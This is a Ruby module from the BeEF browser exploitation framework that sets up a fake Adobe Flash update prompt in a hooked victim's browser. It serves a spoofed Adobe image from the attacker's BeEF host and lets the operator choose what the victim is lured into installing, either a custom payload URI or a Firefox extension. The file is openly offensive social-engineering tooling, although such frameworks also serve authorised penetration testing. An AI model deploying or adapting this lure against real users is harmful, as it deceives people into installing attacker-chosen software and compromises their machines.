#
# Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_flash_update < BeEF::Core::Command
  
  def pre_send
    
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_flash_update/img/eng.png', '/adobe/flash_update', 'png')
    
  end
  
  def self.options
    @configuration = BeEF::Core::Configuration.instance
    proto = @configuration.get("beef.http.https.enable") == true ? "https" : "http"
    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")
    beef_port = @configuration.get("beef.http.public_port") || @configuration.get("beef.http.port")
    base_host = "#{proto}://#{beef_host}:#{beef_port}"
    
    image = "#{base_host}/adobe/flash_update.png"

    return [
        {'name' =>'image', 'description' =>'Location of image for the update prompt', 'ui_label'=>'Image', 'value' => image},
        {'name' => 'payload', 'type' => 'combobox', 'ui_label' => 'Payload', 'store_type' => 'arraystore',
          'store_fields' => ['payload'], 'store_data' => [['Custom_Payload'],['Firefox_Extension']],
          'valueField' => 'payload', 'displayField' => 'payload', 'mode' => 'local', 'autoWidth' => true, 'value' => 'Custom_Payload'},
        {'name' =>'payload_uri', 'description' =>'Custom Payload URI', 'ui_label'=>'Custom Payload URI',
            'value' => "https://github.com/beefproject/beef/archive/master.zip"}
    ]
  end
  
  def post_execute
    
    content = {}
    content['result'] = @datastore['result']
    save content
    
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/adobe/flash_update.png')   
        
  end
  
end
